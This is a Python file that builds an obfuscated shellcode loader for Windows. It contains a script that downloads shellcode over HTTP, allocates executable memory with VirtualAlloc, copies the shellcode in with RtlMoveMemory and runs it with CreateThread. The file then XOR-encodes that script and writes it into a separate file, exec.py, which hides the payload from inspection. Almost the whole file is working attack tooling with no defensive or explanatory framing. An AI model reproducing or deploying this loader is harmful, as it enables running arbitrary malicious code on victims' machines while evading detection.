def cu(data):
    encoded_data = ""
    for char in data:
        encoded_data += chr(ord(char) ^ Y)  # Perform XOR operation
    return encoded_data

Y = 0xFF
# Custom encoded script

script = f"""
static_url = "http://127.0.0.1:8080/download/shellcode"
rs = rr.get(static_url)
if rs.status_code == 200:
    data = rs.content
    b_x = data
    print("Received shellcode data:", len(data), "bytes") 

kk.windll.kernel32.VirtualAlloc.restype = kk.c_void_p
kk.windll.kernel32.CreateThread.argtypes = (
    kk.c_int, kk.c_int, kk.c_void_p, kk.c_int, kk.c_int, kk.POINTER(kk.c_int)
)

s = kk.windll.kernel32.VirtualAlloc
t = kk.windll.kernel32.CreateThread
u = kk.windll.kernel32.RtlMoveMemory
v = kk.windll.kernel32.WaitForSingleObject
spc = s(kk.c_int(0), kk.c_int(len(b_x)), kk.c_int(0x3000), kk.c_int(0x40))
bf = (kk.c_char * len(b_x)).from_buffer_copy(b_x)
u(kk.c_void_p(spc), bf, kk.c_int(len(b_x)))
hndl = t(kk.c_int(0), kk.c_int(0), kk.c_void_p(spc), kk.c_int(0), kk.c_int(0),
            kk.pointer(kk.c_int(0)))
v(hndl, kk.c_uint32(0xffffffff))
"""

# Decode the script
encoded_script = cu(script)

# Execute the decoded script
print(encoded_script )

with open('exec.py', 'r',encoding='utf-8') as file:
            file_content = file.read()

            
lines = file_content.split('\n')
updated_lines = []
for line in lines:
    if 'en=' in line:
        parts = line.split('"""')
        if len(parts) >= 2:
            parts[1] = encoded_script  # Update the URL with the obfuscated value
            line = '"""'.join(parts)
    updated_lines.append(line)

updated_content = '\n'.join(updated_lines)
with open('exec.py', 'w', encoding='utf-8') as file:
    file.write(updated_content)